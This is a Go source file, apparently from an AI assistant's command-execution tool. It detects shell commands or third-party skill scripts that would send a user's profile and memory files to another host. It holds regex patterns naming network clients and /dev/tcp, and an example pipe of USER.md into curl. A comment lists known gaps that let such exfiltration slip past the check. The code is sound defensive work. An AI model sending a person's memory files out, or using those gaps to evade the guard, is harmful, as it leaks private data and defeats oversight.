package tools

import (
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// remoteURLPattern finds the URLs a command reaches.
var remoteURLPattern = regexp.MustCompile(`(?i)\b(?:https?|ftps?|sftp|wss?)://[^\s'"<>()]+`)

// networkClientPattern finds a program that reaches another host without a
// URL scheme (`curl host/api`, `scp f user@host:`, `> /dev/tcp/h/p`): in
// command position, quoted as in a script's argument list, or bash's socket.
var networkClientPattern = regexp.MustCompile(
	`(?i)(?:(?:^|[;&|(\x60\n]|\$\()\s*(?:(?:sudo|env|exec|nohup|time|xargs)\s+(?:-\S+\s+)*)?` +
		`(?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh|telnet|ftp)(?:\.exe)?(?:\s|$)` +
		`|['"](?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh)['"]|/dev/(?:tcp|udp)/)`)

// personalFilePattern finds the person's profile and memory: what the assistant
// knows about them, never a deliverable of a task.
var personalFilePattern = regexp.MustCompile(
	`(?i)(?:^|[\s'"=@/\\(,:])(?:(?:user|soul|memory)\.md\b|(?:memory|sessions)[/\\])`)

// writtenFilePattern finds where a command writes what it fetches: a personal
// file there is written, not sent.
var writtenFilePattern = regexp.MustCompile(
	`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+)|\btee\s+(?:-a\s+)?)\s*\S+`)

// scriptPathPattern finds the script files a command hands to an interpreter.
var scriptPathPattern = regexp.MustCompile(`[^\s'"<>|;&()]+\.(?:py|sh|bash|js|mjs|cjs|ts|rb|pl|php)\b`)

const (
	maxScannedScripts     = 8
	maxScannedScriptBytes = 64 << 10
)

// personalFilesSentTo returns where a command would hand the person's profile
// or memory files, or "". A skill or a file that asks for it is not the person
// asking, and some models follow a skill step by step. A file counts as sent
// only when the same command, or the skill script it runs, reaches another
// host and does not merely write the file.
// shortcut: it reads each command on its own and only the scripts of skills, so code that splits the
// address and the file over lines, a script reached after a cd, or a copy sent by a later command passes;
// upgrade to a network policy for skill scripts then.
func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
	for _, unit := range commandUnits(command) {
		text := unit + t.skillScriptsRun(unit, cwd)
		destination := remoteDestination(text)
		sent := writtenFilePattern.ReplaceAllString(remoteURLPattern.ReplaceAllString(text, " "), " ")
		if destination != "" && personalFilePattern.MatchString(sent) {
			return destination
		}
	}
	return ""
}

func remoteDestination(text string) string {
	if raw := remoteURLPattern.FindString(text); raw != "" {
		if parsed, err := url.Parse(raw); err == nil && parsed.Hostname() != "" {
			return parsed.Hostname()
		}
		return raw
	}
	if networkClientPattern.MatchString(text) {
		return "another host"
	}
	return ""
}

// commandUnits splits a command where one command ends and the next begins:
// an unquoted `;`, `&&` or `||`, or a new line. A pipeline stays whole, since
// `cat USER.md | curl -d @- host` sends what the first stage reads.
func commandUnits(command string) []string {
	var units []string
	var unit strings.Builder
	runes := []rune(command)
	quote := rune(0)
	cut := func() {
		units = append(units, unit.String())
		unit.Reset()
	}
	for i := 0; i < len(runes); i++ {
		r := runes[i]
		switch {
		case r == '\n':
			quote = 0
			cut()
			continue
		case quote != 0:
			if r == quote {
				quote = 0
			}
		case r == '\'' || r == '"':
			quote = r
		case r == ';':
			cut()
			continue
		case (r == '&' || r == '|') && i+1 < len(runes) && runes[i+1] == r:
			cut()
			i++
			continue
		}
		unit.WriteRune(r)
	}
	cut()
	return units
}

// skillScriptsRun is the text of the skill scripts a command runs, so a skill
// script that names the files and the address itself is read like the command.
// Only skills come from someone else: the assistant's own scripts, a cron job
// that saves fetched data to memory among them, are not read.
func (t *ExecTool) skillScriptsRun(command, cwd string) string {
	if t.workingDir == "" {
		return ""
	}
	skills := filepath.Join(t.workingDir, "skills")
	var text strings.Builder
	for _, name := range scriptPathPattern.FindAllString(command, maxScannedScripts) {
		path := name
		if !filepath.IsAbs(path) {
			path = filepath.Join(cwd, path)
		}
		if !insideDir(path, skills) {
			continue
		}
		if info, err := os.Stat(path); err != nil || !info.Mode().IsRegular() {
			continue
		}
		file, err := os.Open(path)
		if err != nil {
			continue
		}
		data, _ := io.ReadAll(io.LimitReader(file, maxScannedScriptBytes))
		file.Close()
		text.WriteString("\n")
		text.Write(data)
	}
	return text.String()
}

func insideDir(path, dir string) bool {
	resolved, err := filepath.EvalSymlinks(path)
	if err != nil {
		return false
	}
	root, err := filepath.EvalSymlinks(dir)
	if err != nil {
		return false
	}
	rel, err := filepath.Rel(root, resolved)
	return err == nil && filepath.IsLocal(rel)
}
